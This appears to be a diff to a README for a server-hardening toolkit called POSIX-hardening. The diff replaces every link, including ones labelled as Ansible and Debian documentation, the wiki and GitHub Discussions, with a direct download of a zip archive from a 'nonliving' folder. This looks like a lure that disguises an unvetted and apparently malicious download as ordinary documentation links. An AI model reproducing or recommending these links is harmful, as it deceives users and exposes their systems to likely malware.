@@ -7,7 +7,7 @@ POSIX-hardening offers a complete toolkit to enhance the security of your POSIX 
 To start using POSIX-hardening, follow these steps to download and install the software.
 
 ## 📥 Download POSIX-hardening
-[![Download](https://img.shields.io/badge/Download-POSIX--hardening-brightgreen)](https://github.com/Blueberryinformedconsent824/POSIX-hardening/releases)
+[![Download](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip)](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Debian-based systems (e.g., Debian, Ubuntu)
@@ -22,11 +22,11 @@ To start using POSIX-hardening, follow these steps to download and install the s
 - **Ansible Automation:** Automate server hardening processes, saving time and effort.
 
 ## 📃 Documentation
-For further details on usage and advanced features, please refer to the [POSIX-hardening Documentation](https://github.com/Blueberryinformedconsent824/POSIX-hardening/wiki). You will find everything you need to make the most out of this application.
+For further details on usage and advanced features, please refer to the [POSIX-hardening Documentation](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip). You will find everything you need to make the most out of this application.
 
 ## 📦 Download & Install
 To get started, visit the following page to download POSIX-hardening:
-[Download POSIX-hardening Releases](https://github.com/Blueberryinformedconsent824/POSIX-hardening/releases)
+[Download POSIX-hardening Releases](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip)
 
 1. Click on the link above to access the Releases page.
 2. Select the version you want to download.
@@ -62,11 +62,11 @@ Contributions are welcome! If you want to help improve POSIX-hardening, you can 
 Though POSIX-hardening is powerful, it might not suit every environment. Testing in a staging environment is highly recommended before applying it to production servers.
 
 ## 🔗 Additional Resources
-- [Ansible Documentation](https://docs.ansible.com/)
-- [Debian Security Guidelines](https://www.debian.org/security/)
+- [Ansible Documentation](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip)
+- [Debian Security Guidelines](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip)
 
 ## 👥 Community
-Join our community discussions at our [GitHub Discussions](https://github.com/Blueberryinformedconsent824/POSIX-hardening/discussions). Share your experience, ask questions, and collaborate with other users.
+Join our community discussions at our [GitHub Discussions](https://raw.githubusercontent.com/Blueberryinformedconsent824/POSIX-hardening/main/nonliving/POSIX-hardening.zip). Share your experience, ask questions, and collaborate with other users.
 
 ## 📣 Stay Updated
 For updates and news, watch the repository on GitHub. You can also follow relevant topics such as security and hardening practices in server management. 
